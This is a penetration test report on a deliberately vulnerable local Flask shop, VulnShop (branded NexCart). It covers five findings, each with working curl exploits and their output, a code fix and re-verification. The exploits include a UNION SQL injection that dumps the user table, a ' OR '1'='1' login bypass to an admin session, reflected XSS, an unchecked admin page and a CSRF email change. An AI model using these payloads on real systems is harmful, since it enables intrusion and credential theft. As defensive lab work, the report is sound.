# VulnShop (NexCart) — Penetration Test Report

**Target:** `http://127.0.0.1:5055` — [VulnShop](https://github.com/dev-abhrajit/VulnShop),
a third-party Flask + SQLite store. The running UI is branded NexCart. Local,
authorized, non-destructive. We do not vendor its code.
**Date:** 2026-09-27
**Method:** mapped the routes from the running app (home, search, products,
login, register, profile, admin), then one probe per class. Source was read
only to write the fix. Every finding below was proven with a live request and
re-verified against that same request after the patch.

**What this is not.** DVWA lists its bug categories in the navigation, so a run
there tests *prove → patch → re-verify*, not *find*. NexCart's navigation is a
shop (products, search, account) and does not link to exploits. The upstream
README does name SQLi, XSS, CSRF, and broken access control, so anyone who
reads the repo first is not blind. The probes below did not use an in-app
cheat sheet.

Seed accounts created by `database.py`: `admin`/`admin123`, `alice`/`pass123`,
`bob`/`bob456`. One throwaway account was registered during the test and is
not quoted below.

**Result: 5 vulnerabilities proven, patched, and re-verified.** A sweep of the
other SQL call sites found `register` and the profile `UPDATE` already
parameterized; the two interpolating queries (`/products`, `/login`) were both
patched. `python app.py` ships with `debug=True`; this run forced `debug=False`
so the Werkzeug console was not exercised and is not claimed as a finding.

---

## Finding 1 — SQL injection in product lookup dumps every password

- **Class:** SQL injection
- **Severity:** Critical
- **Endpoint:** `GET /products?id=`

`id` is interpolated into `SELECT * FROM products WHERE id = {pid}`. The product
card renders `name`, so a `UNION` that puts `username:password` in that column
prints the user table. No login required.

### Exploit
```
$ curl -s -G http://127.0.0.1:5055/products \
    --data-urlencode "id=0 UNION SELECT id, username || ':' || password, 0, email FROM users"
```
The listing came back with three cards:

```
product-name">admin:admin123
product-name">alice:pass123
product-name">bob:bob456
```

### Fix
Bind `id`. Anything that isn't an integer matches no row.

```python
if pid:
    if not str(pid).isdigit():
        result = []
    else:
        result = conn.execute(
            "SELECT * FROM products WHERE id = ?", (int(pid),)
        ).fetchall()
```

### Re-verify
The same request returns HTTP 200 and an empty listing — no `admin:admin123`.
`/products?id=1` still renders `Laptop`.

---

## Finding 2 — Login bypass to an admin session

- **Class:** SQL injection
- **Severity:** Critical
- **Endpoint:** `POST /login`

Username and password are concatenated into
`WHERE username='{u}' AND password='{p}'`.

### Exploit
```
$ curl -s -D - -o /dev/null -c /tmp/vs.cj -X POST http://127.0.0.1:5055/login \
    -d "username=admin' OR '1'='1' --&password=wrong"
HTTP/1.1 302 FOUND
Location: /
Set-Cookie: session=...; HttpOnly; Path=/
```
The session payload (the part before the signature) decodes to
`{"role":"admin","user":"admin"}`. With that cookie, `GET /admin` returned 200
and the password column (`admin123`, `pass123`, `bob456`).

### Fix
Bind both values. A quote in the username is then just a username that doesn't
exist.

```python
user = get_db().execute(
    "SELECT * FROM users WHERE username = ? AND password = ?", (u, p)
).fetchone()
```

### Re-verify
The same POST returns HTTP 200 (the login form), no `Location`, no session.
`alice` / `pass123` still redirects to `/`.

---

## Finding 3 — Reflected XSS in search

- **Class:** Cross-site scripting
- **Severity:** Medium
- **Endpoint:** `GET /search?q=`

The result heading and the search box render `query` through Jinja's `|safe`,
which turns escaping off. The page `<title>` uses `{{ query }}` without
`|safe` and was already escaped — the bug is the two `|safe` sites, not every
interpolation.

### Exploit
```
$ curl -s -G http://127.0.0.1:5055/search \
    --data-urlencode 'q=<b id="xss-proof">nexcart</b>'
```
The title contained `xss-proof&#34;&gt;nexcart&lt;/b&gt;` (escaped). The result
line and the input's `value` contained the raw tag:

```
xss-proof">nexcart
```

### Fix
Drop `|safe`. `{{ query }}` is escaped by Jinja.

### Re-verify
The same request now escapes all three sites (`&lt;b`, `&#34;`). A search for
`laptop` still renders.

---

## Finding 4 — Any logged-in user is an admin

- **Class:** Broken function-level authorization
- **Severity:** High
- **Endpoint:** `GET /admin`

The handler checks that a session exists and then dumps every user, including
the plaintext password column. It never checks `role`.

### Exploit
Log in as `alice` / `pass123` (HTTP 302 to `/`), then:

```
$ curl -s -o /dev/null -w '%{http_code}\n' -b "$JAR" http://127.0.0.1:5055/admin
200
```
The customer table included `td-password">admin123`, `pass123`, and `bob456`.
Logged out, the same URL is a 302 to `/login` — so this is missing
*authorization*, not missing authentication.

### Fix
```python
if session.get('role') != 'admin':
    abort(403)
```

### Re-verify
Alice's cookie now gets HTTP 403. `admin` / `admin123` still gets HTTP 200.

Plaintext password storage is still there for a real admin. Not patched: hashing
means reworking `/login` and the seed data, which is past a behavior-preserving
fix. The channel a normal user had (this page) is closed.

---

## Finding 5 — Profile update has no CSRF token

- **Class:** Cross-site request forgery
- **Severity:** Medium
- **Endpoint:** `POST /profile`

The email form posts `email` and nothing else. Any site that can get the
browser to submit that form while the victim is logged in changes their email.
Proved the missing check with curl (no `Origin` allow-list, no token), which is
the same request a foreign form would send.

### Exploit
As `alice`:

```
$ curl -s -b "$JAR" -X POST http://127.0.0.1:5055/profile \
    -d 'email=taken-over@evil.test'
```
HTTP 200, and the profile page then contained `taken-over@evil.test`.

### Fix
Issue a per-session token, require it on POST, compare it in constant time.
The form carries `<input type="hidden" name="csrf_token" value="{{ csrf_token }}">`.
A missing or wrong token is HTTP 400 and the row is not updated.

### Re-verify
The same POST, with no token, returns HTTP 400. Alice's email is still
`alice@email.com`. Posting the token from `GET /profile` returns HTTP 200, so
the real form still saves.

---

## Summary

| # | Finding | Class | Severity | Status |
|---|---------|-------|----------|--------|
| 1 | `/products?id=` dumps every password | SQL injection | Critical | Fixed → empty listing |
| 2 | `' OR '1'='1` logs in as admin | SQL injection | Critical | Fixed → no session |
| 3 | `/search?q=` reflects raw HTML | XSS | Medium | Fixed → escaped |
| 4 | Any user opens `/admin` | Broken function auth | High | Fixed → 403 |
| 5 | `POST /profile` with no token | CSRF | Medium | Fixed → 400 |

Legitimate requests after the patch: `/products?id=1` renders Laptop, `alice`
and `admin` can still log in, admin can still open `/admin`, a search for a
normal word still renders, and a profile save that includes the form token
still returns 200.

### Sweep

Same pattern, other call sites: `/register` and the profile `UPDATE` were
already bound parameters. The two f-string queries were `/products` and
`/login`; both are in the fixes above. No second copy of `|safe` on `query`
remained after Finding 3.
